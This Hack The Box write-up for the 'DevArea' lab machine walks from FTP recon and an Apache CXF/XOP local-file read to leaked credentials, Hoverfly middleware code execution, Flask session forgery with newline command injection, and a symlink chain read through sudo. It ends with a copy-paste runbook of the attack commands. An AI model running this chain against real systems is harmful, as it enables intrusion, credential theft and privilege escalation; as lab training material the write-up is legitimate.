# DevArea HTB Writeup — From Recon to Root (Evidence-Driven)

> This writeup is built from commands and outputs verified in-lab.  
> Goal: teach **how to think**, not just what to paste.

## TL;DR

DevArea is compromised by chaining:

1. FTP enumeration and JAR collection (`employee-service.jar`)
2. JAR reverse engineering to identify CXF/SOAP attack surface
3. SOAP endpoint fingerprinting on `:8080`
4. Apache CXF/XOP local-file disclosure behavior
5. Hoverfly admin credential validation and authenticated middleware execution
6. Foothold as `dev_ryan`
7. SysWatch privesc chain: web command injection + symlink logic flaw in log view
8. Root file read through allowed sudo path

Final `root.txt`:

```text
<ROOT_FLAG_REDACTED>
```

---

## 1) Recon: finding the right attack surface

### 1.1 FTP -> JAR -> reverse-engineering came first

The earliest useful path is FTP enumeration: retrieve `employee-service.jar`, then reverse it to map exposed functionality.

Commands:
```bash
# when FTP port 21 is reachable
ftp devarea.htb
# anonymous login
# get employee-service.jar

# local triage / reverse indicators
sha256sum /home/ctf/ctf/employee-service.jar
jar tf /home/ctf/ctf/employee-service.jar | head -n 40
jar tf /home/ctf/ctf/employee-service.jar | grep -Ei 'cxf|wsdl|employee' | head -n 40
```

What this gave us:
- `EmployeeService.class` / `EmployeeServiceImpl.class`
- `META-INF/cxf/*` and `org/apache/cxf/*`

That is the concrete reason we prioritized SOAP/CXF over unrelated attack vectors.

### Why not random brute-force first?
Because the target exposed a SOAP service endpoint early, and SOAP faults are high signal for framework-specific exploitation.

### Command
```bash
echo HEALTH && curl -sS -i --max-time 8 http://devarea.htb:8080/employeeservice | sed -n '1,20p'
```

### Signal we needed
- HTTP 500 with SOAP fault payload
- Jetty server header

This tells us the endpoint is alive and processing SOAP semantics.

---

## 2) Why Apache CXF was the correct hypothesis

From local extracted artifacts in workspace:

```bash
ls META-INF/cxf | sed -n '1,20p'
find org/apache/cxf -maxdepth 2 -type d | sed -n '1,20p'
```

We get clear CXF indicators (`cxf.xml`, `aegis.xsd`, `org/apache/cxf/...`).

### CVE context
- The exploit class aligns with CXF XOP/SSRF-style weaknesses (commonly associated with CVE-2022-46364 discussions).
- In this engagement, exploitability is proven by behavior (successful file reflection), not by banner-only claims.

---

## 3) Exploiting CXF/XOP to read local files

### Hypothesis
If XOP include processing is weakly constrained, `file://` URIs may be dereferenced.

### Command
```bash
python3 /home/ctf/ctf/xop_read.py file:///etc/syswatch.env --timeout 20 | sed -n '1,120p'
```

### Output highlights
- `SYSWATCH_SECRET_KEY=...`
- `SYSWATCH_ADMIN_PASSWORD=<SYSWATCH_ADMIN_PASSWORD_REDACTED>`
- `SYSWATCH_LOG_DIR=/opt/syswatch/logs`

This is a major pivot point: we now have auth material and internal paths.

---

## 4) How Hoverfly credentials were actually obtained

A common failure in writeups is pretending creds were “obvious.” They were not.

### What happened
- `<SYSWATCH_ADMIN_PASSWORD_REDACTED>` was tested against Hoverfly token auth and failed.
- Then we pulled Hoverfly's local log file with:
   `python3 /home/ctf/ctf/xop_read.py file:///home/hoverfly/.hoverfly/hoverfly.log --timeout 30`
- After that pivot, `<HOVERFLY_ADMIN_PASSWORD_REDACTED>` was tested and succeeded.

History evidence:
```bash
nl -ba ~/.zsh_history | sed -n '7451,7463p'
```

What that history block shows:
- line 7456: hoverfly log-read command
- lines 7460-7462: token-auth test with `<HOVERFLY_ADMIN_PASSWORD_REDACTED>`

Validation:
```bash
curl -sS -i -X POST http://devarea.htb:8888/api/token-auth -H 'Content-Type: application/json' -d '{"username":"admin","password":"<REDACTED>"}'
curl -sS -i -X POST http://devarea.htb:8888/api/token-auth -H 'Content-Type: application/json' -d '{"username":"admin","password":"<REDACTED>"}'
```

Expected:
- first request `401`
- second request `200` + JWT token

---

## 5) Hoverfly authenticated code execution path

### Advisory context
- GHSA-r4h8-hfp2-ggmf (often referenced with CVE-2024-45388 in community analysis)

### Proof command
```bash
bash /home/ctf/ctf/proof_hoverfly.sh
```

### Why this script exists
It executes token → mode change → middleware update → proxy trigger → marker verification in one stable flow.

Expected proof:
- API updates return `200`
- marker verification yields `HOVERFLY_RCE_OK`

---

## 6) Foothold and environment reliability choices

### Why Paramiko instead of plain SSH
Plain SSH repeatedly timed out (`255`/`124`) in this session. Paramiko provided reproducible command execution.

### Command
```bash
python3 /home/ctf/ctf/paramiko_proof.py
```

### Checks performed
- `id`, `whoami`, `hostname`
- `sudo -l`

We confirm user context `dev_ryan` and privileged execution of `syswatch.sh` with constrained forms.

---

## 7) Why SysWatch was selected for privesc

Direct traversal payloads were blocked by input checks, so we switched from payload guessing to source analysis.

### Code path 1: web command injection
`syswatch_gui/app.py`
- `/service-status` endpoint
- `subprocess.run(..., shell=True)`
- weak regex allows newline injection (`\n`)

### Code path 2: symlink-chain flaw in log viewing
`syswatch.sh` `view_logs`
- allows basename-like symlink target
- then reads `$LOG_DIR/$target`
- second-level symlink can point to `/root/root.txt`

### Chain logic
- Use web injection (as `syswatch`) to prepare symlink chain in log dir.
- Use allowed sudo command to read through that chain as root.

---

## 8) Root exploit execution

### Command
```bash
python3 /home/ctf/ctf/exploit_rootflag_symlink.py
```

### Script workflow
1. Forge Flask session from leaked secret key.
2. Send newline injection payload to `/service-status`.
3. Create:
   - `/opt/syswatch/logs/x -> /root/root.txt`
   - `/opt/syswatch/logs/service.log -> x`
4. Execute `sudo /opt/syswatch/syswatch.sh logs service.log`.

### Result
Root flag is printed.

---

## 9) Why each custom script was written

| Script | Problem solved |
|---|---|
| `xop_read.py` | Reliable multipart/XOP file-read testing without manual SOAP crafting each time |
| `proof_hoverfly.sh` | Deterministic authenticated RCE proof with marker validation |
| `paramiko_proof.py` | Stable remote execution when native SSH transport was flaky |
| `exploit_rootflag_symlink.py` | Repeatable full-chain privesc with reduced operator error |

---

## 10) Copy/paste runbook

```bash
# (Optional first stage when FTP is reachable)
ftp devarea.htb
# anonymous login, download employee-service.jar

# Local jar triage
sha256sum /home/ctf/ctf/employee-service.jar
jar tf /home/ctf/ctf/employee-service.jar | grep -Ei 'cxf|wsdl|employee' | head -n 40

# Recon
curl -sS -i --max-time 8 http://devarea.htb:8080/employeeservice | sed -n '1,20p'

# Leak secrets
python3 /home/ctf/ctf/xop_read.py file:///etc/syswatch.env --timeout 20 | sed -n '1,120p'

# Validate hoverfly auth
curl -sS -i -X POST http://devarea.htb:8888/api/token-auth -H 'Content-Type: application/json' -d '{"username":"admin","password":"<REDACTED>"}'

# Prove middleware execution
bash /home/ctf/ctf/proof_hoverfly.sh

# Validate foothold + sudo
python3 /home/ctf/ctf/paramiko_proof.py

# Root chain
python3 /home/ctf/ctf/exploit_rootflag_symlink.py
```

---

## 11) Evidence index

- `/home/ctf/ctf/proof_output_clean.txt`
- `/home/ctf/ctf/proof_hoverfly_output.txt`
- `/home/ctf/ctf/proof_paramiko_output.txt`
- `/home/ctf/ctf/proof_credential_origin.txt`
- `/home/ctf/ctf/proof_credential_validation.txt`
- `/home/ctf/ctf/proof_root_chain.txt`

---

## 12) Final status

- Initial exploit: proven
- Authenticated pivot: proven
- Privesc chain: proven
- Root compromise: proven
